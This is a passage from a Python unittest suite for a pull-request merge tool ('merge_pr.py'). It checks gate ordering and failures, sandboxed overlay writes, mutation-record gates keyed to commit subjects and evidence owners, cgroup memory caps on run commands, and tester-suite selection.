        self.assertTrue(lines[at + 1].startswith(('PASS integration sanitizers', 'FAIL integration sanitizers')) and all(k < at for k in suite), info)

    def expect_fail(self, r, result, failed, info):
        self.assertEqual(r.returncode, 1, info)
        self.assertEqual([n for s, n in result if s == 'FAIL'], failed, info)
        self.assertTrue(r.stdout.splitlines()[-1].startswith('FAIL: gates on '), info)
        st = json.loads(self.state_file().read_text())
        self.assertEqual((st['passed'], st['tested'], st['master']),
                         (False, git(self.wt, 'rev-parse', 'HEAD'), git(self.main, 'rev-parse', 'master')), info)

    def test_gates_failing_gate(self):
        self.control({'fail': ['integration']})
        self.state(None)
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.expect_fail(r, result, ['integration sanitizers'], info)
        self.assertEqual(len(result), 8, info)
        self.no_mutation(r, info)

    def test_gates_quick_preflight(self):
        self.control({'fail': ['d:quick']})
        self.state(None)
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.expect_fail(r, result, [f'{D_TESTER} quick'], info)
        self.assertIn(f'SKIP {D_TESTER} full runs: the quick pre-flight failed', r.stdout, info)
        self.assertEqual([n for _, n in result if ' full ' in n], [], info)
        self.assertEqual(sorted(g['mode'] for g in runs if g['name'] == 'd'), ['quick'], info)

    def test_gates_full_cxx(self):
        self.control({'fail': ['d:full:g++-14']})
        self.state(None)
        r, result, runs = self.gates()
        self.expect_fail(r, result, [f'{D_TESTER} full g++-14'], self.info(stdout=r.stdout, stderr=r.stderr))

    def leftovers(self):
        return git(self.wt, 'status', '--porcelain', '--ignored', '--untracked-files=all')

    def test_gates_overlay(self):
        """Gates and testers that write into the tree (new, ignored and modified files, caches, a nested repository) still
        pass, and none of it reaches the real worktree."""
        self.state(None)
        made = ['__pycache__/m.cpython-314.pyc', 'deep/__pycache__/n.pyc', 'ignored-1', 'left.txt', 'deep/dir/u.txt', 'notes.txt']
        self.control({'touch': {'workspace': made, 'd': ['d-left.txt', 'notes.txt'], 'integration': ['ignored-2']},
                      'mkrepo': {'workspace': ['nested'], 'd': ['nested-d']}})
        notes = (self.wt / 'notes.txt').read_text()
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual((r.returncode, [s for s, _ in result if s != 'PASS']), (0, []), info)
        self.assertTrue(json.loads(self.state_file().read_text())['passed'], info)
        self.assertEqual((self.leftovers(), (self.wt / 'notes.txt').read_text()), ('', notes), info)
        for p in made + ['nested', 'nested-d', 'd-left.txt']:
            self.assertFalse((self.wt / p).exists() and p != 'notes.txt', f'{info} {p}')

    def test_gates_deleted_tester(self):
        """A pull request that deletes a tester of its package's targets fails the gates with that line."""
        (self.wt / X_TESTER).unlink()
        commit(self.wt, 'drop the x tester')
        self.state('P001')
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.expect_fail(r, result, [], info)
        self.assertIn(f'FAIL {X_TESTER}: the pull request deletes a tester of its package', r.stdout.splitlines(), info)
        self.assertIn('suites: 01-d_tester.py', r.stdout.splitlines(), info)
        self.assertEqual(len(result), 8, info)
        self.no_mutation(r, info)

    MASTER_HEADERS = {'02-Data Structures/05-x.hpp': '#pragma once\n', '04-Graphs/03-gone.hpp': '#pragma once\n',
                      '02-Data Structures/98-basic.hpp': '#pragma once\n', '05-Mathematics/02-kept.hpp': '#pragma once\n',
                      **{f'{d}/00-index.md': '# Inventory\n' for d in ('03-Geometry', '04-Graphs', '05-Mathematics', '06-Miscellaneous')}}

    def header_pr(self):
        """Master gains four headers (and inventories for plan.py); the pull request, rebased on it, modifies one and an aggregate, adds three (one nested,
        one 99- aggregate) and deletes one. Returns the headers 04-mutation.py check must get, by the oracle o_mutated."""
        for rel, text in self.MASTER_HEADERS.items():
            write(self.main, rel, text)
        commit(self.main, 'master headers')
        git(self.wt, 'rebase', '-q', 'master')
        edits = {'02-Data Structures/05-x.hpp': '#pragma once\n// pr\n', '03-Geometry/07-y.hpp': '#pragma once\n',
                 '02-Data Structures/98-basic.hpp': '#pragma once\n#include "05-x.hpp"\n', '03-Geometry/99-all.hpp': '#pragma once\n',
                 '03-Geometry/Docs/07-y.hpp': '#pragma once\n'}
        for rel, text in edits.items():
            write(self.wt, rel, text)
        (self.wt / '04-Graphs/03-gone.hpp').unlink()
        commit(self.wt, 'pr headers')
        want = sorted(p for p in edits if o_mutated(p))
        self.assertEqual(want, ['02-Data Structures/05-x.hpp', '03-Geometry/07-y.hpp'])
        return want

    def expect_mutation(self, r, result, runs, want, info, status='PASS'):
        """The mutation records gates want ((name, args) in run order), each once with status, right after the last suite
        gate and before integration, every one at the default cap (the stub declares mb=8192, which a gate must not take)."""
        names = [n for _, n in result]
        self.assertEqual([(s, n) for s, n in result if n.startswith('mutation records')], [(status, n) for n, _ in want], info)
        at = names.index(want[0][0])
        self.assertEqual(names[at:at + len(want) + 1], [n for n, _ in want] + ['integration sanitizers'], info)
        self.assertTrue(all('_tester.py' not in n for n in names[at:]) and '_tester.py' in names[at - 1], info)
        self.assertNotIn(self.NONE, r.stdout, info)
        mine = sorted((g['mode'], g['cxx'], int(g['mem']), g['args']) for g in runs if g['name'] == 'mutation')
        self.assertEqual(mine, sorted(('-', 'None', self.caps()[0], args) for _, args in want), info)

    def test_gates_mutation_records(self):
        want = self.header_pr()
        self.state('P001')
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        suites = [X_TESTER, D_TESTER]
        names = ['consistency', 'plan check', 'plan doctor', *(f'{s} {k}' for s in suites for k in ('quick', 'full g++', 'full g++-14')),
                 'mutation records', 'integration sanitizers', 'workspace check']
        self.assertEqual((r.returncode, result), (0, [('PASS', n) for n in names]), info)
        gates = o_mutation_gates(MINI_PACKAGES, 'P001', {h: ['pr headers'] for h in want}, want)
        self.assertEqual(gates, [('mutation records', ['check', *want])], info)
        self.expect_mutation(r, result, runs, gates, info)
        self.assertTrue(json.loads(self.state_file().read_text())['passed'], info)

    def test_gates_mutation_failing(self):
        want = self.header_pr()
        self.control({'fail': ['mutation']})
        self.state(None)
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.expect_fail(r, result, ['mutation records'], info)
        self.expect_mutation(r, result, runs, [('mutation records', ['check', *want])], info, 'FAIL')  # no package, no evidence: strict
        self.assertEqual(result[-2:], [('PASS', 'integration sanitizers'), ('PASS', 'workspace check')], info)

    def test_gates_mutation_master_only(self):
        """Headers master adds or changes after the branch point, the pull request rebased on it: not the pull request's."""
        for rel, text in self.MASTER_HEADERS.items():
            write(self.main, rel, text)
        commit(self.main, 'master headers')
        git(self.wt, 'rebase', '-q', 'master')
        write(self.main, '02-Data Structures/05-x.hpp', '#pragma once\n// master\n')
        write(self.main, '06-Miscellaneous/04-m.hpp', '#pragma once\n')
        commit(self.main, 'master changes headers')
        git(self.wt, 'rebase', '-q', 'master')
        self.state(None)
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual((r.returncode, [n for _, n in result if n.startswith('mutation records')]), (0, []), info)
        self.no_mutation(r, info)
        write(self.wt, '05-Mathematics/02-kept.hpp', '#pragma once\n// pr\n')
        commit(self.wt, 'pr changes one header')
        self.state(None)
        r, result, runs = self.gates()
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        self.expect_mutation(r, result, runs, [('mutation records', ['check', '05-Mathematics/02-kept.hpp'])], info)

    def history(self, commits):
        """Rewrites the pull request over master: the tester commit, then one commit per (message, paths), each path
        rewritten (an empty message allowed, no path an empty commit). Returns {path: subjects of the commits changing
        it, newest first}, checked against the raw git log -- path (unstripped: empty subjects are lines too)."""
        git(self.wt, 'reset', '-q', '--hard', 'master')
        write(self.wt, D_TESTER, gate_stub('d', ''))
        commit(self.wt, 'pr adds a tester')
        for k, (message, paths) in enumerate(commits):
            for path in paths:
                write(self.wt, path, f'#pragma once\n// commit {k}\n')
            git(self.wt, 'add', '-A')
            git(self.wt, 'commit', '-q', '--allow-empty', '--allow-empty-message', '-m', message)
        subjects = {}
        for message, paths in reversed(commits):
            for path in paths:
                subjects.setdefault(path, []).append(message.split('\n')[0])
        for path, want in subjects.items():
            log = git(self.wt, 'log', '--format=%s', 'master..HEAD', '--', path, check=False).stdout
            self.assertEqual(log.split('\n')[:-1], want, path)  # fixture sanity
        return subjects

    def set_evidence(self, owners):
        """Master's plan with the evidence lists owners ({package: [paths]}, each path written), rendered and committed, the
        pull request rebased on it. Returns the plan."""
        pk = copy.deepcopy(MINI_PACKAGES)
        for e in pk['packages']:
            e['evidence'] = owners.get(e['id'], [])
            for path in e['evidence']:
                write(self.main, path, 'evidence\n')
        save_packages(self.main, pk)
        plan_cmd(self.main, 'render')
        if git(self.main, 'status', '--porcelain'):
            commit(self.main, 'master: evidence')
        git(self.wt, 'rebase', '-q', 'master')
        return pk

    def run_mutation_case(self, case, pk, package, subjects, want, expect):
        """Gates on the pull request as it stands; the gates must be the oracle's, which must be expect (fixture sanity)."""
        self.state(package)
        r, result, runs = self.gates()
        info = self.info(case=case, stdout=r.stdout, stderr=r.stderr)
        gates = o_mutation_gates(pk, package, subjects, want)
        self.assertEqual(gates, expect, info)
        self.assertEqual(r.returncode, 0, info)
        self.expect_mutation(r, result, runs, gates, info)

    def test_gates_mutation_subjects(self):
        """Per header: a header that only /prune or /restyle commits change (any package's id, the subject line only) keeps
        existing records only, whatever other commits change other files; one other subject on it, a near miss or an empty
        subject (an empty message, also under a /restyle commit) makes it strict."""
        self.header_pr()
        x, y = '02-Data Structures/05-x.hpp', '03-Geometry/07-y.hpp'  # x modified (master has it), y added
        prune, fix = 'P001: prune duplicates', 'P059: maintainer fixes from /merge-pr 3'
        strict, loose = [('mutation records', ['check', x, y])], [('mutation records (existing only)', ['check', '--existing', x, y])]
        cases = (([(prune, [x, y])], loose),
                 ([(prune, [x]), ('P250: prune duplicates', [x, y])], loose),
                 ([('P001: restyle\n\nMoves contract comments into the evidence document.', [x, y])], loose),
                 ([('P030: restyle', [x, y]), (prune, [y])], loose),
                 ([(prune, [x, y]), (fix, ['notes.txt'])], loose),  # a maintainer fix of another file
                 ([(prune, [x, y]), (fix, [x, y])], strict),  # a maintainer fix of the headers
                 ([(prune, [x, y]), ('P001: fix review findings', [y])],
                  [('mutation records', ['check', y]), ('mutation records (existing only)', ['check', '--existing', x])]),  # two histories
                 ([('P001: restyle the docs', [x, y])], strict), ([('P01: prune duplicates', [x, y])], strict),
                 ([('', [x, y])], strict), ([('', [x, y]), ('', [])], strict), ([('', [x, y]), ('P001: restyle', [x, y])], strict))
        for commits, expect in cases:
            subjects = self.history(commits)
            self.run_mutation_case(commits, MINI_PACKAGES, 'P001', subjects, [x, y], expect)

    def test_gates_mutation_owners(self):
        """Ordinary subjects: a header whose evidence document another package of master's plan lists, and the pull
        request's package does not, keeps existing records only (no package or one the plan lacks: every package is
        another), the rest are strict; strict gate first."""
        want = self.header_pr()
        x, y = want  # 02-Data Structures/05-x.hpp, 03-Geometry/07-y.hpp
        x_doc, y_doc = '02-Data Structures/Docs/05-x.md', '03-Geometry/Docs/07-y.md'
        subjects = {h: ['pr headers'] for h in want}
        both = [('mutation records', ['check', y]), ('mutation records (existing only)', ['check', '--existing', x])]
        cases = (('P001', {'P030': [x_doc]}, both),  # another package's header beside the package's own
                 ('P001', {'P001': [x_doc, y_doc]}, [('mutation records', ['check', x, y])]),  # the package's own
                 ('P001', {'P001': [x_doc], 'P030': [x_doc]}, [('mutation records', ['check', x, y])]),  # shared: still the package's own
                 (None, {'P001': [x_doc], 'P030': [x_doc]}, both),  # shared, no package
                 ('P001', {'P030': ['04-Graphs/Docs/05-x.md', '02-Data Structures/Docs/05-y.md', '02-Data Structures/05-x.md']},
                  [('mutation records', ['check', x, y])]),  # owned by no package: near misses only
                 (None, {'P001': [x_doc]}, both),
                 ('P999', {'P030': [x_doc], 'P250': [y_doc]}, [('mutation records (existing only)', ['check', '--existing', x, y])]))
        for package, owners, expect in cases:
            pk = self.set_evidence(owners)
            self.run_mutation_case((package, owners), pk, package, subjects, want, expect)

    def test_run_overlay(self):
        self.state()
        notes = (self.wt / 'notes.txt').read_text()
        script = 'mkdir -p __pycache__ d; touch __pycache__/a.pyc ignored-3 u.txt d/v.txt; echo x >> notes.txt; rm .gitignore; git init -q nested; exit 3'
        r = self.mp('run', 7, '--', 'sh', '-c', script, full_path=True)
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 3, info)
        self.assertEqual((self.leftovers(), (self.wt / 'notes.txt').read_text()), ('', notes), info)
        self.assertFalse((self.wt / 'nested').exists(), info)

    def test_gates_refusals(self):
        self.state()
        before = self.state_file().read_text()
        write(self.wt, 'scratch.txt', 'x\n')
        r = self.mp('gates', 7, full_path=True)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn(f'{self.wt} has uncommitted changes', r.stderr, r.stderr)
        (self.wt / 'scratch.txt').unlink()
        write(self.main, 'master.txt', 'moved\n')
        commit(self.main, 'master moves')
        r = self.mp('gates', 7, full_path=True)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn(f"#7 is not based on master: run worktree.py '{self.wt}' --sync first", r.stderr, r.stderr)
        self.assertEqual(self.state_file().read_text(), before)
        self.assertFalse((self.main / '.claude/merge-pr/7').exists())

    MEMMAX = "c = open('/proc/self/cgroup').read().split('::')[1].strip(); print(open('/sys/fs/cgroup' + c + '/memory.max').read().strip())"

    def test_run_cli(self):
        self.state()
        r = self.mp('run', 7, '--', 'bash', '-c', 'exit 5', full_path=True)
        self.assertEqual(r.returncode, 5, r.stderr)
        r = self.mp('run', 7, '--', sys.executable, '-c', self.MEMMAX, full_path=True)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, str(MP.cap.MAIN_MB << 20)), r.stderr)
        r = self.mp('run', '--mb', 64, 7, '--', sys.executable, '-c', self.MEMMAX, full_path=True)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, str(64 << 20)), r.stderr)
        r = self.mp('run', 7, '--mb', 99999, '--', sys.executable, '-c', self.MEMMAX, full_path=True)  # clamped to MAX_MB
        self.assertEqual((r.returncode, r.stdout.strip()), (0, str(16384 << 20)), r.stderr)
        r = self.mp('run', 7, '--', 'pwd', full_path=True)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, str(self.wt)), r.stderr)
        r = self.mp('run', 7, 'pwd', full_path=True)  # the command needs `--`, so it is never parsed as options
        self.assertEqual(r.returncode, 2, r.stderr)
        r = self.mp('run', 7, '--', full_path=True)
        self.assertIn('usage: merge_pr.py run N [--mb MB] -- CMD...', r.stderr)
        r = self.mp('run', 8, '--', 'true', full_path=True)
        self.assertIn('no record of #8', r.stderr)
        st = json.loads(self.state_file().read_text())
        self.state_file().write_text(json.dumps(st | {'worktree': str(self.tmp / 'never-checked-out')}))
        for args in (('run', 7, '--', 'true'), ('gates', 7), ('land', 7)):  # a record from files alone: a refusal, not a traceback
            r = self.mp(*args, full_path=True)
            self.assertEqual((r.returncode, r.stderr.strip()), (1, '#7 is not checked out: run `merge_pr.py checkout 7` first'), args)

    def test_run_cli_mb_after_n(self):
        """The documented form `run N [--mb MB] -- CMD...` (docstring and the usage error)."""
        self.state()
        r = self.mp('run', 7, '--mb', 64, '--', sys.executable, '-c', self.MEMMAX, full_path=True)
        self.assertEqual((r.returncode, r.stdout.strip()), (0, str(64 << 20)), self.info(stderr=r.stderr))

    def test_suites(self):
        """Testers of the package's targets in master's plan at ROOT (the pull request drops C01's targets from its own
        batches.json), of every changed inventory target (also without a package), and every changed tester that exists; deleted
        testers of the package's targets or among the changed paths, whatever the package."""
        for rel in ('96-Local Testing/05-Mathematics/01-gone_tester.py', '96-Local Testing/05-Mathematics/03-m_tester.py',
                    '96-Local Testing/07-Strings/04-s_tester.py', '96-Local Testing/07-Strings/_04_t_tester.py',
                    '96-Local Testing/06-Miscellaneous/02-q_tester.py'):
            write(self.main, rel, 'x\n')
        commit(self.main, 'master testers')
        git(self.wt, 'rebase', '-q', 'master')
        (self.wt / '96-Local Testing/05-Mathematics/01-gone_tester.py').unlink()
        write(self.wt, '96-Local Testing/01-Core/01-x_helper.cpp', 'int main() {}\n')
        write(self.wt, '96-Local Testing/01-Core/02-other_tester.py', 'x\n')
        write(self.wt, '09-Contest Testing/a_tester.py', 'x\n')
        write(self.wt, '05-Mathematics/03-m.hpp', '#pragma once\n')
        write(self.wt, '07-Strings/_04_s.py', 'x\n')
        write(self.wt, '06-Miscellaneous/Docs/02-q.md', 'not a target\n')
        bt = json.loads((self.wt / PLAN_REL / 'batches.json').read_text())
        next(b for b in bt['batches'] if b['id'] == 'C01')['targets'] = []
        write(self.wt, PLAN_REL + '/batches.json', json.dumps(bt, indent=2) + '\n')
        commit(self.wt, 'more')
        changed = git(self.wt, 'diff', '--name-only', '--no-renames', 'master...HEAD').splitlines()
        batches = {b['id']: b for b in MINI_BATCHES['batches']}  # master's plan, independent of the worktree's
        for package in ('P001', 'P030', None, 'P250'):
            pk = next((p for p in MINI_PACKAGES['packages'] if p['id'] == package), {'batches': []})
            targets = {t for b in pk['batches'] for t in batches[b]['targets']} | {p for p in changed if o_header(p)}
            found = set().union(*(o_tests(self.wt, t) for t in targets)) | set(changed)
            want = sorted(t for t in found if t.startswith('96-Local Testing/') and t.endswith('_tester.py') and (self.wt / t).is_file())
            with patch.dict(os.environ, ISOLATED, clear=True), patch.object(MP, 'ROOT', self.main):
                got, deleted = MP.suites(self.wt, {'package': package})
            self.assertEqual(got, want, f'package {package}')
            own = {t for b in pk['batches'] for t in batches[b]['targets']}
            gone = {t for x in own for t in o_tests(self.main, x)} | {t for t in changed if t.startswith('96-Local Testing/') and t.endswith('_tester.py')}
            self.assertEqual(deleted, sorted(t for t in gone if not (self.wt / t).is_file()), f'package {package}')
            self.assertIn('96-Local Testing/05-Mathematics/01-gone_tester.py', deleted, f'package {package}: a deleted tester the pull request changes')
            self.assertIn('96-Local Testing/05-Mathematics/03-m_tester.py', got)
            self.assertIn('96-Local Testing/07-Strings/04-s_tester.py', got)
            self.assertIn('96-Local Testing/07-Strings/_04_t_tester.py', got)
            self.assertNotIn('96-Local Testing/06-Miscellaneous/02-q_tester.py', got)
            self.assertNotIn('96-Local Testing/05-Mathematics/01-gone_tester.py', got)
            self.assertEqual(X_TESTER in got, package == 'P001', package)
        (self.wt / X_TESTER).unlink()
        commit(self.wt, 'drop the x tester')
        want = sorted([X_TESTER, '96-Local Testing/05-Mathematics/01-gone_tester.py'])  # changed paths now, so whatever the package
        for package in ('P001', 'P030', None, 'P250'):
            with patch.dict(os.environ, ISOLATED, clear=True), patch.object(MP, 'ROOT', self.main):
                got, deleted = MP.suites(self.wt, {'package': package})
            self.assertEqual((deleted, X_TESTER in got), (want, False), f'package {package}')
        for p in ('01-Core/01-x.hpp', '07-Strings/_04_s.py', '05-Mathematics/12-a-b.hpp'):
            self.assertTrue(o_header(p) and MP.HEADER.fullmatch(p), p)
        for p in ('01-Core/x.hpp', '01-Core/1-x.hpp', '09-x/01-a.hpp', '01-Core/Docs/01-x.hpp', '07-Strings/_4_s.py', '07-Strings/04-s.py',
                  '01-Core/01-x.hpp.bak'):
            self.assertFalse(o_header(p) or MP.HEADER.fullmatch(p), p)
        for p in ('01-Core/01-x.hpp', '07-Strings/12-a-b.hpp', '02-Data Structures/97-x.hpp', '01-Core/98-x.hpp', '03-Geometry/99-all.hpp',
                  '08-Python/01-x.hpp', '09-x/01-a.hpp', '01-Core/Docs/01-x.hpp', '01-Core/1-x.hpp', '01-Core/01-.hpp', '07-Strings/_04_s.py'):
            self.assertEqual(o_mutated(p), bool(MP.MUTATED.fullmatch(p)), p)
        mutation = load(ROOT / '96-Local Testing/04-mutation.py', 'merge_tester_mutation')
        self.assertEqual(MP.MUTATED.pattern, mutation.HEADER.pattern, 'merge_pr.MUTATED must stay 04-mutation.py HEADER')
        for subject in ('P001: prune duplicates', 'P252: restyle', 'P999: restyle', 'P001: restyle ', ' P001: restyle', 'P001: Restyle',
                        'P001: prune', 'P001:restyle', 'P0001: restyle', 'P01: restyle', 'p001: restyle', 'Pabc: restyle', 'P001: restyle\nx',
                        'P001: prune duplicates; restyle', 'P001: restyle: restyle', ''):
            self.assertEqual(o_mechanical(subject), bool(MP.MECHANICAL.fullmatch(subject)), repr(subject))
        self.assertEqual([o_mechanical(s) for s in ('P001: prune duplicates', 'P252: restyle', 'P001: restyle ', '')], [True, True, False, False])
        for p, core in (('01-Core/01-x.hpp', True), ('01-Core/06-modintmini.hpp', False), ('01-Core/Docs/01-x.hpp', False),
                        ('02-Data Structures/01-d.hpp', False), ('01-Core/17-polymini2.hpp', False), ('01-Core/x.hpp', False)):
            self.assertEqual((o_core_full(p), bool(MP.CORE_FULL.fullmatch(p))), (core, core), p)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('--mode', choices=('quick', 'full', 'stress'), default=os.environ.get('CP_TEST_MODE', 'full'))
    parser.add_argument('--seed', type=int, default=int(os.environ.get('CP_TEST_SEED', '42')))
    parser.add_argument('--rounds', type=int, default=20, help='random rounds multiplier in stress mode')
    args = parser.parse_args()
    MODE, SEED, ROUNDS = args.mode, args.seed, args.rounds
    suite = unittest.TestSuite()
    for case in (Units, Classify, Sync, MergePR, Sandbox, Gates):
        suite.addTests(case(n) for n in unittest.defaultTestLoader.getTestCaseNames(case) if MODE != 'quick' or n in QUICK)
    print(f"merge-pr checks: mode={MODE} seed={SEED} rounds={ROUNDS if MODE == 'stress' else '-'} tests={suite.countTestCases()}", flush=True)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    ok, tty = result.wasSuccessful(), sys.stdout.isatty()
    print((f'\033[{32 if ok else 31}m' if tty else '') + ('PASS' if ok else 'FAIL') + ('\033[0m' if tty else ''), flush=True)
    raise SystemExit(not ok)
